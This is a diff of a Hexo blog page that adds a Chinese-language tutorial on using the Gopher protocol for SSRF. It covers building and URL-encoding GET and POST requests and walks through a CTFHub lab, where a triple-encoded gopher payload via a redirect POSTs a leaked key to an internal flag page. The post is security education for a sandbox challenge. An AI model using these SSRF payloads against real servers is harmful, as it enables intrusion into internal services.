@@ -4,7 +4,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
-  <meta name="robots" content="noindex,follow">
+  
   <meta name="generator" content="Hexo 7.3.0">
   <meta http-equiv='x-dns-prefetch-control' content='on' />
   
@@ -17,22 +17,25 @@
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
   
-  <title>归档 - 无言の小屋</title>
+  <title>Gopher协议 - 无言の小屋</title>
 
   
-    <meta name="description" content="在谷底也要开花，在海底也要望月">
-<meta property="og:type" content="website">
-<meta property="og:title" content="归档">
-<meta property="og:url" content="https://ikunmma.github.io/archives/2025/index.html">
+    <meta name="description" content="Gopher协议概述Gopher是互联网早期的一种协议 在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口  利用gopher协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp 等，也可以发送 GET、POST 请求，这可以拓宽 SSRF 的攻击面  格式1gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Gopher协议">
+<meta property="og:url" content="https://ikunmma.github.io/2025/03/23/Gopher%E5%8D%8F%E8%AE%AE/index.html">
 <meta property="og:site_name" content="无言の小屋">
-<meta property="og:description" content="在谷底也要开花，在海底也要望月">
+<meta property="og:description" content="Gopher协议概述Gopher是互联网早期的一种协议 在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口  利用gopher协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp 等，也可以发送 GET、POST 请求，这可以拓宽 SSRF 的攻击面  格式1gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-23T02:32:12.942Z">
+<meta property="article:modified_time" content="2025-03-23T02:34:24.669Z">
 <meta property="article:author" content="Hackun">
+<meta property="article:tag" content="Gopher">
 <meta name="twitter:card" content="summary">
   
   
   
-  
+  <meta name="keywords" content="Gopher">
 
   <!-- feed -->
   
@@ -50,7 +53,7 @@
 </head>
 <body>
 
-<div class="l_body s:aa index tech" id="start" layout="undefined" ><aside class="l_left"><div class="leftbar-container">
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
 
 
 <header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/img/aa.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">无言の小屋</div><div class="sub normal cap">在谷底也要开花，在海底也要望月</div><div class="sub hover cap" style="opacity:0"> Designed by hackun</div></a></div></header>
@@ -62,21 +65,136 @@
 <nav class="menu dis-select"></nav>
 </div>
 <div class="widgets">
+
+
 <widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/03/23/HTML/"><span class="title">HTML</span></a><a class="item title" href="/2025/03/23/Gopher%E5%8D%8F%E8%AE%AE/"><span class="title">Gopher协议</span></a><a class="item title" href="/2025/03/23/C%E8%AF%AD%E8%A8%80/"><span class="title">C语言</span></a><a class="item title" href="/2025/03/22/hello-world/"><span class="title">Hello World</span></a><a class="item title" href="/2025/03/23/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/"><span class="title">[强网杯 2019]随便注</span></a><a class="item title" href="/2025/03/23/%5BSUCTF-2019%5DEasySQL/"><span class="title">[SUCTF 2019]EasySQL</span></a><a class="item title" href="/2025/03/23/SSRF%E6%BC%8F%E6%B4%9E/"><span class="title">SSRF漏洞</span></a><a class="item title" href="/2025/03/23/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">PHP反序列化</span></a><a class="item title" href="/2025/03/23/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/"><span class="title">PHP特性总结</span></a><a class="item title" href="/2025/03/23/php/"><span class="title">PHP</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
 
-<header class="header mobile-only"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/img/aa.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">无言の小屋</div><div class="sub normal cap">在谷底也要开花，在海底也要望月</div><div class="sub hover cap" style="opacity:0"> Designed by hackun</div></a></div></header>
-
- 
 
 
-<div class="navbar top"><nav class="post"><a href="/">近期发布</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a class="active" href="/archives/">归档</a></nav></div><div class="post-list archives"><article class="" id="archive"><div class='archive-header h4'>2025</div><div class="archive-list"><a class='post fs14' href="/2025/03/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><time>03-23</time><span>文件上传漏洞</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/XSS%E6%BC%8F%E6%B4%9E/"><time>03-23</time><span>XSS漏洞</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/SSRF%E6%BC%8F%E6%B4%9E/"><time>03-23</time><span>SSRF漏洞</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/SQL%E6%B3%A8%E5%85%A5/"><time>03-23</time><span>SQL注入</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><time>03-23</time><span>PHP文件包含漏洞</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/"><time>03-23</time><span>PHP特性总结</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><time>03-23</time><span>PHP反序列化</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/php/"><time>03-23</time><span>PHP</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/MySQL/"><time>03-23</time><span>MySQL</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/kali%E4%BC%98%E5%8C%96/"><time>03-23</time><span>kali优化</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/JavaScript/"><time>03-23</time><span>JavaScript</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/HTTP/"><time>03-23</time><span>HTTP</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/HTML/"><time>03-23</time><span>HTML</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/Gopher%E5%8D%8F%E8%AE%AE/"><time>03-23</time><span>Gopher协议</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/C%E8%AF%AD%E8%A8%80/"><time>03-23</time><span>C语言</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/CRLF%E6%BC%8F%E6%B4%9E/"><time>03-23</time><span>CRLF漏洞</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/BurpSuit%E7%9A%84%E4%BD%BF%E7%94%A8/"><time>03-23</time><span>BurpSuit的使用</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/"><time>03-23</time><span>[强网杯 2019]随便注</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/23/%5BSUCTF-2019%5DEasySQL/"><time>03-23</time><span>[SUCTF 2019]EasySQL</span></a></div><div class="archive-list"><a class='post fs14' href="/2025/03/22/hello-world/"><time>03-22</time><span>Hello World</span></a></div></article></div>
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-03-23T02:32:12.942Z">2025-03-23</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-03-23T02:34:24.669Z">2025-03-23</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Gopher协议</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Gopher是互联网早期的一种协议</p>
+<p>在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口</p>
+<blockquote>
+<p>利用gopher协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp 等，也可以发送 GET、POST 请求，这可以拓宽 SSRF 的攻击面</p>
+</blockquote>
+<h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>gopher的默认端口是70</p>
+</li>
+<li><p>如果是post请求，回车换行要用到<code>%0d%0a</code>(post请求有几个必备请求头)</p>
+</li>
+<li><p>基于post请求，如果有多个参数，也要把<code>&amp;</code>进行URL编码(<code>%26</code>)</p>
+</li>
+</ul>
+<h2 id="Gopher发送HTTP请求"><a href="#Gopher发送HTTP请求" class="headerlink" title="Gopher发送HTTP请求"></a>Gopher发送HTTP请求</h2><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p>
+<h3 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h3><h4 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h4><ul>
+<li><p>构造HTTP数据包</p>
+</li>
+<li><p>URL编码、替换回车换行为%0d%0a</p>
+</li>
+<li><p>发送gopher协议</p>
+</li>
+</ul>
+<blockquote>
+<p>问号（？）需要转码为URL编码，也就是<code>%3f</code><br>回车换行要变为<code>%0d%0a,</code>但如果直接用工具转，可能只会有%0a<br>在HTTP包的最后要加<code>%0d%0a</code>，代表消息结束（具体可研究HTTP包结束）</p>
+</blockquote>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ssrf/get.php?name=ikunma</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>构造请求包：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1/_GET /ssrf/get.php?name=ikunma HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>编码（这边是一次，有的要两次）</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_GET%20/ssrf/base/get.php%3fname=ikunma%20HTTP/1.1%0d%0AHost:%20127.0.0.1%0d%0A</span><br></pre></td></tr></table></figure>
+
+<p>注：URL 编码中，%0A 和 %0a 实际上是表示相同的字符，即换行符。它们之间的区别在于大小写。在 URL 编码中，字母的大小写通常是不敏感的，因此 %0A 和 %0a 都会被解释为换行符</p>
+<h3 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h3><p>格式：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ssrf/post.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">host:127.0.0.1</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:11</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">name</span><span class="operator">=</span>ikunma</span></span><br></pre></td></tr></table></figure>
+
+<p>写包：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST /ssrf/base/post.php HTTP/1.1</span><br><span class="line">Host:127.0.0.1</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:11</span><br><span class="line"></span><br><span class="line">name=ikunma</span><br></pre></td></tr></table></figure>
+
+<p>url编码（实际操作要两次）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST%20%2Fssrf%2Fbase%2Fpost.php%20HTTP%2F1.1%0D%0AHost%3A127.0.0.1%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0A%0D%0Aname%3Dikunma%0D%0A</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>编码次数</strong></p>
+<p>传参经过多少次跳转就需要经过多少次url编码</p>
+<p>直接curl后接<code>gopher://</code>就编码一次</p>
+<p>利用<code>?url=gopher://</code>就编码两次</p>
+<p>还经过302跳转，就编码三次。</p>
+</blockquote>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>CTFHub-SSRF系列-POST请求</p>
+<p>先本地访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=a1fd25f0d3ac467c1368019781a49713--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再访问一下302.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/302.php</span><br></pre></td></tr></table></figure>
+
+<p>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL /302.php was not found on this server.&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.25 (Debian) Server at challenge-c47c6ea85c502c46.sandbox.ctfhub.com Port 10800&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里通过302.php的跳转来实现gopher协议伪造</p>
+<p>将</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/302.php?url=gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"></span><br><span class="line">key=a1fd25f0d3ac467c1368019781a49713</span><br></pre></td></tr></table></figure>
+
+<p>url编码3次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%252F302.php%253Furl%253Dgopher%253A%252F%252F127.0.0.1%253A80%252F_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253Da1fd25f0d3ac467c1368019781a49713</span><br></pre></td></tr></table></figure>
+
+<p>接在?url&#x3D;之后</p>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2025/03/23/HTML/">HTML</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/03/23/C%E8%AF%AD%E8%A8%80/">C语言</a></div></section></div>
+
+
+
+
+
+
 <footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Hackun</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
 </div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
-</aside><div class='float-panel blur'>
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Gopher%E5%8D%8F%E8%AE%AE"><span class="toc-text">Gopher协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F"><span class="toc-text">格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gopher%E5%8F%91%E9%80%81HTTP%E8%AF%B7%E6%B1%82"><span class="toc-text">Gopher发送HTTP请求</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET%E5%9E%8B"><span class="toc-text">GET型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F-1"><span class="toc-text">格式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E5%9E%8B"><span class="toc-text">POST型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
   </button>
